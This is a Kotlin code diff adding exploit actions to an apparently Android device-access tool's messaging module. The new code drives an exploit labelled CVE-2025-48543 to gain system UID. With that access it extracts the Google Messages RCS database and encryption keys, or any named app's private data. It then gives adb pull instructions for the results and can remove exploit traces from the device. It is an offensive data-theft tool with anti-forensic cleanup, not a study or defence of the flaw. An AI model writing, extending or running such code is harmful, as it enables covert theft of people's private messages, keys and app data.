@@ -130,6 +130,36 @@ class MessagingModule : ArchonModule {
             name = "Google Messages Info",
             description = "Get Google Messages version, UID, and RCS configuration",
             privilegeRequired = false
+        ),
+        ModuleAction(
+            id = "check_vuln",
+            name = "Check CVE-2025-48543",
+            description = "Check if device is vulnerable to ART UAF → system UID exploit",
+            privilegeRequired = false
+        ),
+        ModuleAction(
+            id = "exploit_rcs",
+            name = "Exploit → Extract RCS",
+            description = "CVE-2025-48543: achieve system UID, extract bugle_db + keys (locked BL ok)",
+            privilegeRequired = false
+        ),
+        ModuleAction(
+            id = "exploit_app",
+            name = "Exploit → Extract App Data",
+            description = "CVE-2025-48543: extract any app's data (exploit_app:<package>)",
+            privilegeRequired = false
+        ),
+        ModuleAction(
+            id = "exploit_status",
+            name = "Extraction Status",
+            description = "Check what's been extracted so far",
+            privilegeRequired = false
+        ),
+        ModuleAction(
+            id = "exploit_cleanup",
+            name = "Cleanup Exploit Traces",
+            description = "Remove all exploit artifacts and extracted data from device",
+            privilegeRequired = false
         )
     )
 
@@ -174,6 +204,12 @@ class MessagingModule : ArchonModule {
             actionId == "dump_decrypted" -> dumpDecrypted(shizuku)
             actionId == "extract_keys" -> extractKeys(shizuku)
             actionId == "gmsg_info" -> gmsgInfo(shizuku)
+            actionId == "check_vuln" -> checkVuln(context)
+            actionId == "exploit_rcs" -> exploitRcs(context)
+            actionId.startsWith("exploit_app:") -> exploitApp(context, actionId.substringAfter(":"))
+            actionId == "exploit_app" -> ModuleResult(false, "Usage: exploit_app:<package.name>")
+            actionId == "exploit_status" -> exploitStatus(context)
+            actionId == "exploit_cleanup" -> exploitCleanup(context)
             else -> ModuleResult(false, "Unknown action: $actionId")
         }
     }
@@ -518,5 +554,85 @@ class MessagingModule : ArchonModule {
         } catch (e: Exception) {
             ModuleResult(false, "Failed: ${e.message}")
         }
+    }
+
+    // ── CVE-2025-48543 Exploit ──────────────────────────────────────
+
+    private fun checkVuln(context: Context): ModuleResult {
+        val exploit = ExploitManager(context)
+        val check = exploit.checkVulnerability()
+        val hasBinary = exploit.hasExploitBinary()
+        val details = listOf(
+            "SDK: ${check.sdk}",
+            "Patch: ${check.patchLevel}",
+            "Vulnerable: ${check.vulnerable}",
+            "Exploit binary: ${if (hasBinary) "AVAILABLE" else "NOT FOUND"}",
+            check.reason
+        )
+        return ModuleResult(true,
+            if (check.vulnerable) "VULNERABLE to CVE-2025-48543" else "NOT vulnerable",
+            details)
+    }
+
+    private fun exploitRcs(context: Context): ModuleResult {
+        val exploit = ExploitManager(context)
+        val check = exploit.checkVulnerability()
+        if (!check.vulnerable) {
+            return ModuleResult(false, "Device not vulnerable: ${check.reason}")
+        }
+
+        val result = exploit.extractRcsDatabase()
+        val details = result.details.toMutableList()
+        if (result.success) {
+            details.add("")
+            details.add("Pull extracted data:")
+            details.add("  adb pull ${result.outputDir}/ ./extracted_rcs/")
+            if (result.extractedFiles.isNotEmpty()) {
+                details.add("")
+                details.add("Files (${result.extractedFiles.size}):")
+                result.extractedFiles.take(20).forEach { details.add("  $it") }
+            }
+        }
+        return ModuleResult(result.success,
+            if (result.success) "RCS database extracted via ${result.method}" else "Failed: ${result.error}",
+            details)
+    }
+
+    private fun exploitApp(context: Context, packageName: String): ModuleResult {
+        val exploit = ExploitManager(context)
+        val result = exploit.extractAppData(packageName)
+        return ModuleResult(result.success,
+            if (result.success) "App data extracted: $packageName" else "Failed: ${result.error}",
+            result.details)
+    }
+
+    private fun exploitStatus(context: Context): ModuleResult {
+        val exploit = ExploitManager(context)
+        val status = exploit.getExtractionStatus()
+        val details = mutableListOf<String>()
+        details.add("Extracted: ${status["extracted"]}")
+        if (status["extracted"] == true) {
+            details.add("Output: ${status["output_dir"]}")
+            details.add("Has bugle_db: ${status["has_bugle_db"]}")
+            if (status["bugle_db_size"] != null) {
+                details.add("bugle_db size: ${(status["bugle_db_size"] as Long) / 1024}KB")
+            }
+            details.add("shared_prefs: ${status["shared_prefs_count"]} files")
+            val files = status["files"] as? List<*>
+            if (files != null) {
+                details.add("Total files: ${files.size}")
+            }
+            if (status["device_info"] != null) {
+                details.add("")
+                details.add(status["device_info"].toString())
+            }
+        }
+        return ModuleResult(true, "Extraction status", details)
+    }
+
+    private fun exploitCleanup(context: Context): ModuleResult {
+        val exploit = ExploitManager(context)
+        val cleaned = exploit.cleanup()
+        return ModuleResult(true, "Cleanup complete", cleaned)
     }
 }
